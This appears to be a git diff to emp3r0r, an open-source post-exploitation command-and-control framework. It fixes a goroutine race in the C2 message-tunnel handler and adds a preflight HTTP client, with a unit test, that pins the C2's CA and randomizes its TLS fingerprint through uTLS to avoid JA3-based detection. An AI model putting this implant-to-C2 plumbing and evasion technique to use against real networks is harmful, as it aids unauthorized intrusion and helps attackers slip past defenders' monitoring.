@@ -1,0 +1,196 @@
+thudart
+diff --git a/core/internal/cc/server/handler_messagetun.go b/core/internal/cc/server/handler_messagetun.go
+index 8632b5f1c..c2540453a 100644
+--- a/core/internal/cc/server/handler_messagetun.go
++++ b/core/internal/cc/server/handler_messagetun.go
+@@ -6,6 +6,7 @@ import (
+ 	"fmt"
+ 	"net/http"
+ 	"strconv"
++	"sync"
+ 	"sync/atomic"
+ 	"time"
+ 
+@@ -33,8 +34,11 @@ func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
+ 	secureConn := transport.NewSecureConn(conn)
+ 
+ 	ctx, cancel := context.WithCancel(req.Context())
++	var wg sync.WaitGroup
+ 	defer func() {
+ 		logging.Debugf("handleMessageTunnel exiting")
++		cancel() // Signal goroutine to stop
++		wg.Wait() // Wait for goroutine to finish before returning
+ 		live.AgentControlMapMutex.Lock()
+ 		for t, c := range live.AgentControlMap {
+ 			if c.Conn == secureConn {
+@@ -45,11 +49,12 @@ func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
+ 		}
+ 		live.AgentControlMapMutex.Unlock()
+ 		_ = conn.Close()
+-		cancel()
+ 		logging.Debugf("handleMessageTunnel exited")
+ 	}()
+ 	in := cbor.NewDecoder(secureConn)
++	wg.Add(1)
+ 	go func() {
++		defer wg.Done()
+ 		defer cancel()
+ 		for ctx.Err() == nil {
+ 			var msg def.MsgTunData
+@@ -120,6 +125,11 @@ func handleMessageTunnel(wrt http.ResponseWriter, req *http.Request) {
+ 			// here we just respond to keep-alive if it matches any criteria
+ 			// or if it's explicitly a hello
+ 			if msg.Response == nil && len(msg.CmdSlice) > 0 {
++				// Check if context is still valid before writing
++				if ctx.Err() != nil {
++					logging.Debugf("Context cancelled, skipping handshake response")
++					return
++				}
+ 				// verify hello
+ 				logging.Debugf("Handshake from %s successful", msg.Tag)
+ 				// respond with random data, wrapped in MsgTunData
+diff --git a/core/internal/transport/tls.go b/core/internal/transport/tls.go
+index 73026c23f..26ad0ff25 100644
+--- a/core/internal/transport/tls.go
++++ b/core/internal/transport/tls.go
+@@ -4,6 +4,7 @@ import (
+ 	"net/http"
+ 	"net/url"
+ 	"strings"
++	"time"
+ 
+ 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
+ 	"github.com/jm33-m0/emp3r0r/core/lib/util"
+@@ -80,3 +81,47 @@ init_transport:
+ 	logging.Printf("Transport initialized (%s)", c2url)
+ 	return &http.Client{Transport: tr}
+ }
++
++// CreatePreflightHTTPClient creates a lightweight HTTP client for preflight checks
++// Only adds C2's CA cert and uses utls with random JA3 fingerprint
++// This is suitable for preflight checks where we want minimal overhead
++func CreatePreflightHTTPClient(c2Addr string) *http.Client {
++	// C2 URL
++	addr := c2Addr
++	if !strings.HasPrefix(addr, "http") {
++		addr = "https://" + addr
++	}
++	c2url, err := url.Parse(addr)
++	if err != nil {
++		logging.Printf("Error parsing C2 address '%s': %v", addr, err)
++		return nil
++	}
++
++	// Create a cert pool with only C2's CA cert
++	rootCAs, err := ExtractCABundle(CACrtPEM)
++	if err != nil {
++		logging.Printf("ExtractCABundle: %v", err)
++		return nil
++	}
++
++	// Trust only C2's CA cert in our TLS client
++	c2Host := c2url.Hostname()
++	config := &utls.Config{
++		ServerName:         c2Host,
++		InsecureSkipVerify: false,
++		RootCAs:            rootCAs,
++	}
++
++	// Use NewUTLSRoundTripper with random ALPN fingerprint for preflight
++	// This avoids the heavy initialization and retry logic in CreateEmp3r0rHTTPClient
++	rt, err := NewUTLSRoundTripper("hellorandomizedalpn", config, nil)
++	if err != nil {
++		logging.Printf("Error creating uTLS round tripper: %v", err)
++		return nil
++	}
++
++	return &http.Client{
++		Transport: rt,
++		Timeout:   30 * time.Second,
++	}
++}
+diff --git a/core/internal/transport/tls_test.go b/core/internal/transport/tls_test.go
+index b287fb34b..027141fa6 100644
+--- a/core/internal/transport/tls_test.go
++++ b/core/internal/transport/tls_test.go
+@@ -170,3 +170,61 @@ func TestCreateEmp3r0rHTTPClient(t *testing.T) {
+ 		}
+ 	})
+ }
++
++func TestCreatePreflightHTTPClient(t *testing.T) {
++	// Generate certs
++	caPEM, serverCert := generateCerts(t)
++
++	// Set global CACrtPEM so CreatePreflightHTTPClient picks it up
++	originalCACrtPEM := CACrtPEM
++	CACrtPEM = caPEM
++	defer func() { CACrtPEM = originalCACrtPEM }()
++
++	// Start Mock HTTPS Server
++	server := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
++		w.WriteHeader(http.StatusOK)
++		w.Write([]byte("preflight ok"))
++	}))
++	server.TLS = &tls.Config{
++		Certificates: []tls.Certificate{serverCert},
++		NextProtos:   []string{"h2"},
++		CurvePreferences: []tls.CurveID{
++			tls.CurveP256,
++			tls.X25519,
++		},
++		MinVersion: tls.VersionTLS12,
++	}
++	server.StartTLS()
++	defer server.Close()
++
++	t.Run("Preflight Client", func(t *testing.T) {
++		client := CreatePreflightHTTPClient(server.URL)
++		if client == nil {
++			t.Fatal("CreatePreflightHTTPClient returned nil")
++		}
++
++		// Verify timeout is set
++		if client.Timeout != 30*time.Second {
++			t.Errorf("Expected timeout to be 30s, got %v", client.Timeout)
++		}
++
++		resp, err := client.Get(server.URL)
++		if err != nil {
++			t.Fatalf("Failed to make request: %v", err)
++		}
++		defer resp.Body.Close()
++
++		if resp.StatusCode != http.StatusOK {
++			t.Errorf("Expected status 200, got %d", resp.StatusCode)
++		}
++
++		body, err := io.ReadAll(resp.Body)
++		if err != nil {
++			t.Fatalf("Failed to read response body: %v", err)
++		}
++
++		if string(body) != "preflight ok" {
++			t.Errorf("Expected 'preflight ok', got '%s'", string(body))
++		}
++	})
++}
+diff --git a/core/lib/preflight/client.go b/core/lib/preflight/client.go
+index 03ff60970..c959bd5f2 100644
+--- a/core/lib/preflight/client.go
++++ b/core/lib/preflight/client.go
+@@ -63,12 +63,11 @@ func Check(config *def.Config) bool {
+ 	}
+ 	req.Header.Set("Content-Type", "application/octet-stream") // Or malleable?
+ 
+-	client := transport.CreateEmp3r0rHTTPClient(def.CCAddress, config.C2TransportProxy)
++	client := transport.CreatePreflightHTTPClient(config.PreflightURL)
+ 	if client == nil {
+-		logging.Errorf("Preflight: failed to create HTTP client for %s", def.CCAddress)
++		logging.Errorf("Preflight: failed to create HTTP client for %s", config.PreflightURL)
+ 		return false
+ 	}
+-	client.Timeout = 30 * time.Second
+ 
+ 	// 3. Send
+ 	resp, err := client.Do(req)
